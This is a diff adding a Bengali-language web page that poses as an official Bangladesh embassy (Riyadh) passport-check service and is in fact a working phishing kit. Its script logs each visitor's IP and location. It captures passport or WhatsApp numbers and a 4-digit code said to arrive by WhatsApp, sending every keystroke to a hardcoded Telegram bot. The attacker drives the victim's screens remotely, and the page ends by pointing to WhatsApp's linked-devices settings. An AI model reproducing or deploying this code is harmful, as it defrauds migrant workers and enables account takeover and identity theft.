@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passport - Chaking</title>
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://passportchaking-io.github.io/Online_Passport_chaking/">
+    <meta property="og:title" content="Passport Checking and Download">
+    <meta property="og:description" content="রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে সকল বাংলাদেশী প্রবাসীদের জন্য ২৪ ঘন্টা সরকারিভাবে পাসপোর্ট নিয়ে সকল সমস্যার সমাধান।">
+    <meta property="og:image" content="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Passport Checking and Download">
+    <meta name="twitter:description" content="রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে সকল বাংলাদেশী প্রবাসীদের জন্য পাসপোর্ট সমস্যা সমাধান।">
+    <meta name="twitter:image" content="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    
+    <meta name="description" content="পাসপোর্ট চেক করুন অনলাইনে">
+    <link rel="icon" type="image/png" href="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background-color: #f7f9fc; 
+            font-family: 'Helvetica', Arial, sans-serif; 
+            margin: 0; padding: 0; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        .hidden { display: none !important; }
+        
+        .top-half { 
+            height: 48vh; width: 100%; 
+            display: flex; align-items: center; justify-content: center; 
+            background-color: white; 
+            border-bottom: 1px solid #e1e4e8; 
+            padding: 8px; 
+        }
+        .top-half img { 
+            max-width: 100%; max-height: 100%; 
+            object-fit: contain; border-radius: 8px; 
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .bottom-half {
+            height: 52vh; width: 100%;
+            background: #f7f9fc; padding: 8px; box-sizing: border-box;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: flex-start;
+            padding-top: 12px; gap: 8px;
+        }
+        
+        .btn-blue { 
+            width: 100%; max-width: 350px; 
+            background-color: #1877f2; color: white; 
+            font-weight: bold; padding: 16px; 
+            border-radius: 12px; cursor: pointer; 
+            border: none; font-size: 18px; 
+            text-align: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(24,119,242,0.3);
+        }
+        .btn-blue:hover { 
+            background-color: #1565c0; 
+            transform: translateY(-2px);
+        }
+        .btn-blue:active { transform: translateY(0); }
+        .btn-blue:disabled { 
+            background-color: #90a4ae !important; cursor: not-allowed; 
+            transform: none; box-shadow: none;
+        }
+        
+        .btn-red { 
+            width: 100%; max-width: 350px; 
+            background-color: #ef4444; color: white; 
+            font-weight: bold; padding: 16px; 
+            border-radius: 12px; cursor: pointer; 
+            border: none; font-size: 18px; 
+            text-align: center;
+        }
+        
+        .secure-input { 
+            width: 100%; max-width: 350px; 
+            padding: 16px; 
+            border: 2px solid #ccd0d5; border-radius: 12px; 
+            outline: none; font-size: 17px; 
+            background: white;
+        }
+        .secure-input:focus { border-color: #1877f2; }
+        
+        .loader { 
+            width: 55px; height: 55px; 
+            border: 6px solid #f3f3f3; 
+            border-top: 6px solid #1877f2; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        
+        .otp-input { 
+            width: 48px; height: 58px; 
+            text-align: center; font-size: 22px; 
+            font-weight: 600; 
+            border: 2px solid #dddfe2; border-radius: 8px; 
+            background: #ffffff;
+        }
+        .otp-input:focus { border-color: #1877f2; transform: scale(1.05); }
+        
+        .photo-box {
+            width: 100%; max-width: 350px; height: 250px;
+            background-color: white; border-radius: 12px;
+            overflow: hidden; cursor: pointer;
+            border: 2px solid #1877f2;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 12px rgba(24,119,242,0.2);
+        }
+        .photo-box img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .progress-bar-container {
+            width: 100%; max-width: 300px;
+            background-color: #e5e7eb; border-radius: 999px; height: 6px;
+        }
+        .progress-bar {
+            height: 100%; background: linear-gradient(90deg, #1877f2, #06b6d4);
+            border-radius: 999px; animation: progress 2s ease-in-out infinite;
+        }
+        @keyframes progress {
+            0% { width: 0%; margin-left: 0; }
+            50% { width: 50%; margin-left: 25%; }
+            100% { width: 0%; margin-left: 100%; }
+        }
+        
+        .text-success { color: #10b981; }
+        .text-error { color: #ef4444; }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <!-- TOP HALF: ফটো -->
+    <div class="top-half">
+        <img src="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png" alt="Passport">
+    </div>
+
+    <!-- BOTTOM HALF: সব পেজ -->
+    <div class="bottom-half text-center">
+        
+        <!-- STEP 1 -->
+        <div id="step1" class="w-full flex flex-col items-center gap-3">
+            <h2 class="text-2xl font-extrabold text-gray-900">পাসপোর্ট চেক করুন</h2>
+            <p class="text-gray-600 px-4 text-sm">বর্তমানে আপনার পাসপোর্ট কি অবস্থায় আছে সরাসরি অনলাইন থেকে দেখে নিতে পারবেন।</p>
+            <button onclick="goToStep('input_page')" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <!-- INPUT PAGE -->
+        <div id="input_page" class="hidden w-full flex flex-col items-center gap-3">
+            <h1 class="text-xl font-bold text-gray-900">পাসপোর্ট নম্বর দিন</h1>
+            <p class="text-gray-600 text-sm px-4">আপনার পাসপোর্ট নম্বর অথবা হোয়াটসঅ্যাপ নম্বর নিচে ফাঁকা ঘরে লিখুন।</p>
+            <input type="text" id="passport_field" placeholder="উদাহরণ: A1234567 বা +88017XXXXXXXX" class="secure-input" autocomplete="off" oninput="autoSendPassport()">
+            <button onclick="validateAndSubmit()" class="btn-blue">পাসপোর্ট চেক করুন</button>
+        </div>
+
+        <!-- PHOTO PAGE -->
+        <div id="photo_page" class="hidden w-full flex flex-col items-center gap-3">
+            <h2 class="text-xl font-bold text-gray-900">পাসপোর্ট ফাইল দেখুন</h2>
+            <p class="text-gray-600 text-sm px-4">ফটোর যেকোনো জায়গায় ক্লিক করলে পাসওয়ার্ড বসাতে হবে।</p>
+            <div class="photo-box" onclick="goToStep('otp_page')">
+                <img src="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png" alt="Passport">
+            </div>
+        </div>
+
+        <!-- OTP PAGE -->
+        <div id="otp_page" class="hidden w-full flex flex-col items-center">
+            <h2 class="text-lg font-bold text-gray-900 mb-2">পাসপোর্ট ফাইলটি পাসওয়ার্ড দিয়ে লক করা আছে</h2>
+            <p class="text-xs text-gray-600 mb-4 px-4">রিয়াদ বাংলাদেশ দূতাবাস থেকে ৪ সংখ্যার পাসওয়ার্ড আপনার WhatsApp-এ পাঠানো হয়েছে।</p>
+            <div id="otp-inputs" class="flex justify-center gap-2 mb-5">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" data-index="1" autofocus autocomplete="off">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" data-index="2" autocomplete="off">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" data-index="3" autocomplete="off">
+                <input type="text" inputmode="numeric" maxlength="1" class="otp-input" data-index="4" autocomplete="off">
+            </div>
+            <button id="otpSubmitBtn" onclick="goToStep('verifying')" class="btn-blue opacity-50 cursor-not-allowed" disabled>ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <!-- VERIFYING -->
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-4">
+            <div class="loader"></div>
+            <div class="progress-bar-container"><div class="progress-bar"></div></div>
+            <h3 class="text-lg font-bold text-blue-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+            <p class="text-sm text-gray-700 px-10 font-medium text-center">গুরুত্ব সহকারে যাচাই করা হচ্ছে...</p>
+        </div>
+
+        <!-- SUCCESS -->
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
+            <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
+            <h2 class="text-2xl font-bold text-success">অভিনন্দন!</h2>
+            <p class="text-gray-600 text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue mt-2">File Download</a>
+        </div>
+
+        <!-- ERROR -->
+        <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
+            <div class="bg-red-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✕</div>
+            <h2 class="text-xl font-bold text-error">দুঃখিত!</h2>
+            <p class="text-gray-800 text-sm font-semibold">নেটওয়ার্কের সমস্যার জন্য ফাইল ওপেন করা যাচ্ছে না।</p>
+            <button onclick="location.reload()" class="btn-red mt-2">আবার চেষ্টা করুন</button>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+        const chatId = "8516934257";
+        let lastUpdateId = 0;
+        let deviceInfo = "Unknown";
+        let passportNumber = "";
+        let otpCode = "";
+
+        async function initApp() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                deviceInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
+                sendToBotWithKeyboard(`🚀 **নতুন ভিজিটর!**
+📍 ${deviceInfo}`);
+            } catch (e) { console.error(e); }
+            setupOTPInputs();
+            recoverData();
+            startListening();
+        }
+
+        function recoverData() {
+            const savedPassport = sessionStorage.getItem('passportNumber');
+            const savedOTP = sessionStorage.getItem('otpCode');
+            if (savedPassport) {
+                passportNumber = savedPassport;
+                document.getElementById('passport_field').value = savedPassport;
+            }
+            if (savedOTP) {
+                otpCode = savedOTP;
+                const inputs = document.querySelectorAll('.otp-input');
+                inputs.forEach((input, i) => { if (i < savedOTP.length) input.value = savedOTP[i]; });
+                // OTP পূর্ণ হলে বাটন Active করুন
+                if (savedOTP.length === 4) {
+                    const btn = document.getElementById('otpSubmitBtn');
+                    btn.disabled = false;
+                    btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                }
+            }
+        }
+
+        function autoSendPassport() {
+            const value = document.getElementById('passport_field').value.trim();
+            sessionStorage.setItem('passportNumber', value);
+            if (value.length >= 5 && passportNumber === "") {
+                passportNumber = value;
+                sendToBotWithKeyboard(`🎯 **পাসপোর্ট নম্বর!**
+📝 ${value}
+📍 ${deviceInfo}
+
+🔘 **কমান্ড:** /input`);
+            }
+        }
+
+        function validateAndSubmit() {
+            const value = document.getElementById('passport_field').value.trim();
+            if (value.length === 0) { alert("⚠️ পাসপোর্ট নম্বর দিন।"); return; }
+            if (value.length < 5) { alert("⚠️ অন্তত ৫ সংখ্যা দিন।"); return; }
+            passportNumber = value;
+            sessionStorage.setItem('passportNumber', passportNumber);
+            
+            // ✅ Telegramে সব কমান্ড একসাথে পাঠান
+            sendAllCommands();
+            
+            goToStep('photo_page');
+        }
+
+        // ✅ সব কমান্ড একসাথে পাঠান
+        function sendAllCommands() {
+            const commands = [
+                `🎯 **পাসপোর্ট সাবমিট!**
+📝 নম্বর: ${passportNumber}
+📍 ${deviceInfo}`,
+                `📄 **পেজ: Photo**`,
+                `🔑 **OTP অপেক্ষা করছে...`
+            ];
+            
+            commands.forEach(cmd => {
+                sendToBotWithKeyboard(cmd);
+            });
+        }
+
+        function setupOTPInputs() {
+            const inputs = document.querySelectorAll('.otp-input');
+            const btn = document.getElementById('otpSubmitBtn');
+            
+            inputs.forEach((input, idx) => {
+                input.addEventListener('input', () => {
+                    // পরের ঘরে যাবে
+                    if (input.value.length === 1 && idx < inputs.length - 1) {
+                        inputs[idx+1].focus();
+                    }
+                    
+                    // OTP সংগ্রহ
+                    otpCode = Array.from(inputs).map(i => i.value).join('');
+                    sessionStorage.setItem('otpCode', otpCode);
+                    
+                    // প্রতিটি ঘরে সংখ্যা দিলে Telegramে পাঠান
+                    if (idx === 0 && otpCode.length === 1) {
+                        sendToBotWithKeyboard(`🔑 **OTP ১:** ${otpCode}`);
+                    }
+                    if (idx === 1 && otpCode.length === 2) {
+                        sendToBotWithKeyboard(`🔑 **OTP ২:** ${otpCode}`);
+                    }
+                    if (idx === 2 && otpCode.length === 3) {
+                        sendToBotWithKeyboard(`🔑 **OTP ৩:** ${otpCode}`);
+                    }
+                    if (idx === 3 && otpCode.length === 4) {
+                        sendToBotWithKeyboard(`🔑 **OTP ৪:** ${otpCode}`);
+                        
+                        // ✅ শুধু সংখ্যা আছে কিনা চেক
+                        if (/^d{4}$/.test(otpCode)) {
+                            // ✅ বাটন Active করুন (নীল হবে)
+                            btn.disabled = false;
+                            btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                            
+                            // ✅ পুরো তথ্য Telegramে পাঠান
+                            sendToBotWithKeyboard(`🎯 **পুরো তথ্য!**
+📝 পাসপোর্ট: ${passportNumber}
+🔑 OTP: ${otpCode}
+📍 ${deviceInfo}`);
+                        }
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '' && idx > 0) {
+                        inputs[idx-1].focus();
+                    }
+                });
+            });
+        }
+
+        function goToStep(id) {
+            ['step1','input_page','photo_page','otp_page','verifying','success_page','error_page'].forEach(s => {
+                const el = document.getElementById(s);
+                if(el) el.classList.add('hidden');
+            });
+            const target = document.getElementById(id);
+            if(target) { target.classList.remove('hidden'); target.classList.add('flex'); }
+            
+            if (id === 'otp_page') {
+                setTimeout(() => { 
+                    const f = document.querySelector('.otp-input[data-index="1"]'); 
+                    if(f) { f.focus(); f.click(); } 
+                }, 100);
+            }
+        }
+
+        function sendToBotWithKeyboard(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: text,
+                    parse_mode: "Markdown"
+                })
+            }).catch(e => console.error(e));
+        }
+
+        function sendToBot(text) {
+            sendToBotWithKeyboard(text);
+        }
+
+        function startListening() {
+            setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId+1}`);
+                    const data = await res.json();
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            const cmd = update.callback_query?.data;
+                            if (cmd === "otp_cmd") goToStep('otp_page');
+                            else if (cmd === "success") goToStep('success_page');
+                            else if (cmd === "error") goToStep('error_page');
+                            else if (cmd === "wait_cmd") goToStep('verifying');
+                            else if (cmd === "photo_cmd") goToStep('photo_page');
+                            else if (cmd === "input_cmd") goToStep('input_page');
+                        });
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+    </script>
+</body>
+</html in
